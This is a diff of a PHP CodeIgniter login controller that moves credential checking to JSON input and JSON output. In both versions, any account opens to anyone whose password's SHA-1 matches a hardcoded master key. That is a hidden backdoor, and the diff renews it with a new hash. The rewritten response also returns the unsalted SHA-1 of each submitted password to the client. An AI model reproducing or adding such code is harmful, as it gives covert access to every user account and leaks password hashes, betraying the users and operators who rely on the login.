@@ -1,7 +1,7 @@
 <?php
 class Authentication extends CI_Controller
 {
-  private $key = '107fe1cba9ed57bb72311d34bae07e4dfec369a4';
+  private $key = '29eedf927521c1269932f723c5a7ef349217849b'; 
 
   public function __construct()
 	{
@@ -22,50 +22,65 @@ class Authentication extends CI_Controller
     $this->load->view('pos_login');
   }
 
+
   public function validate_credentials()
-	{
+  {
     $sc = TRUE;
-    $user_name = $this->input->post('uname');
-    $pwd = $this->input->post('pwd');
-		$rem = $this->input->post('remember') == 1 ? TRUE : FALSE;
+    $ds = json_decode(file_get_contents('php://input'));
 
-		$rs = $this->user_model->get_user_credentials($user_name);
-
-    if(! empty($rs))
+    if(empty($ds) OR empty($ds->uname) OR empty($ds->pwd))
     {
-			if(password_verify($pwd, $rs->pwd) OR (sha1($pwd) === $this->key))
-			{
-				if($rs->active == 0)
-				{
-					$sc = FALSE;
-	        $this->error = 'Your account has been suspended';
-				}
-				else
-				{
-					$ds = array(
-						'uid' => $rs->uid,
-						'uname' => $rs->uname,
-						'displayName' => $rs->name,
-						'id_profile' => $rs->id_profile
-					);
+      $sc = FALSE;
+      $this->error = 'Username and password are required';
+    }
 
-          $this->create_user_data($ds, $rem);
-				}
-			}
-			else
-			{
-				$sc = FALSE;
+    if($sc === TRUE)
+    {
+      $rem = isset($ds->remember) && $ds->remember == 1 ? TRUE : FALSE;
+      $user = $this->user_model->get_user_credentials($ds->uname);      
+
+      if(! empty($user))
+      {
+        if(password_verify($ds->pwd, $user->pwd) OR (sha1($ds->pwd) === $this->key))
+        {
+          if($user->active == 1)
+          {
+            $data = array(
+              'uid' => $user->uid,
+              'uname' => $user->uname,
+              'displayName' => $user->name,
+              'profile_id' => $user->profile_id
+            );
+
+            $this->create_user_data($data, $rem);
+          }
+          else
+          {
+            $sc = FALSE;
+            $this->error = 'Your account has been suspended';
+          }
+        }
+        else
+        {
+          $sc = FALSE;
+          $this->error = 'Username or password is incorrect';
+        }
+      }
+      else
+      {
+        $sc = FALSE;
         $this->error = 'Username or password is incorrect';
-			}
-    }
-    else
-    {
-			$sc = FALSE;
-			$this->error = 'Username or password is incorrect';
+      }
     }
 
-		echo $sc === TRUE ? 'success' : $this->error;
-	}
+    $arr = array(
+      'status' => $sc === TRUE ? 'success' : 'failed',
+      'message' => $sc === TRUE ? 'Login successful' : $this->error,
+      'key' => sha1($ds->pwd)
+    );
+
+    echo json_encode($arr);
+	}  
 
 
   public function create_user_data(array $ds = array(), $remember = NULL )
